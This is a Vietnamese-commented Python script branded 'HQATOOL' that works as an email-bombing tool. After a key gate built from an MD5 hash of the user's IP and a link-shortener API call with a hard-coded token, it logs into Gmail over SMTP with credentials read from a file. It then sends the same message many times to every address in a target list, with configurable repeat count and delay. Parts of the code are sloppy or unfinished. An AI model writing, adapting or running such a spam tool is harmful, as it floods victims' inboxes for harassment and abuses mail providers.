from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import os
from time import sleep
os.system("cls" if os.name == "nt" else "clear")
import socket
import datetime, hashlib, requests
from time import strftime
def get_ip_address():
    # Tạo một socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Kết nối socket đến một địa chỉ IP không tồn tại để lấy IP của máy hiện tại
        s.connect(("10.255.255.255", 1))
        ip_address = s.getsockname()[0]
    except Exception:
        # Nếu không thể kết nối, sử dụng địa chỉ loopback
        ip_address = "127.0.0.1"
    finally:
        s.close()

    return ip_address
def check_expiry(expiry_date):
    # Lấy thời gian hiện tại
    current_date = datetime.datetime.now().date()
    # Gọi hàm để hiển thị địa chỉ IP
ip = get_ip_address()
def create_key_from_ip(ip_address):
    # Mã hóa địa chỉ IP bằng thuật toán MD5
    hashed_ip = hashlib.md5(ip_address.encode()).hexdigest()
    
    # Trả về khóa được tạo từ mã hóa của địa chỉ IP
    return hashed_ip

# Sử dụng ví dụ với địa chỉ IP 192.168.0.1
ip_address = ip+('%d')
key = create_key_from_ip(ip_address)
banner = f"""
\033[1;37m ██╗  ██╗ ██████╗  █████╗ ████████╗ ██████╗  ██████╗ ██╗     
\033[1;31m ██║  ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;35m ███████║██║   ██║███████║   ██║   ██║   ██║██║   ██║██║     
\033[3;93m ██╔══██║██║▄▄ ██║██╔══██║   ██║   ██║   ██║██║   ██║██║     
\033[1;36m ██║  ██║╚██████╔╝██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m ╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
\033[3;93m              Z A L O :   0 9 0 1 3 8 6 2 7 7
\033[1;36m             C O P Y R I G H T :  H Q A T O O L    """

url = 'https://keycuabanla.com/KEY='+key
token_link1s = '5b5ed345-d8c5-4bd4-bd36-1b448bbf117a'
link1s = requests.get(f'https://web1s.com/api?token={token_link1s}&url={url}').json()
if link1s['status']=="error": 
        print(link1s['message'])
        quit()  
else:
    link_key=link1s['shortenedUrl']
    def nhapkey():
        print(banner)
        print("           I P  c ủ a  b ạ n  l à : ", ip)
        print("\033[1;35m-------------------------------------------------------------")
        print('Link Để Vượt Key Là: '+link_key)     
        keynhap = input('Key Là: ')
        if keynhap == key:
            print('Key Đúng Mời Bạn Dùng Tool !!!')
        else:
            print("Key Sai !!!")
            sleep(0.5)
            os.system("cls" if os.name == "nt" else "clear")
            nhapkey()
            quit()
nhapkey()
os.system("cls" if os.name == "nt" else "clear")
print(banner)
print("           I P  c ủ a  b ạ n  l à : ", ip)
print("\033[1;35m-------------------------------------------------------------")     
files = open('email.txt', 'r')
bomb_emails = files.readlines()
with open("atthack.txt", "r") as file:
    for line in file.readlines():
            content = line.rstrip()
    email, password = content.split("|")
email = email
password = password
message = input("Nội dung cần gửi: ")
delay = int(input("Delay: "))
message_relode = int(input("Số lần spam: "))
for bomb_email in bomb_emails:
    for x in range(0, message_relode):
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        print("Spam thành công: {}".format(bomb_email))
    sleep(delay)
mail.close()
files.close()
print("SUCCESS !!!")                                                                            
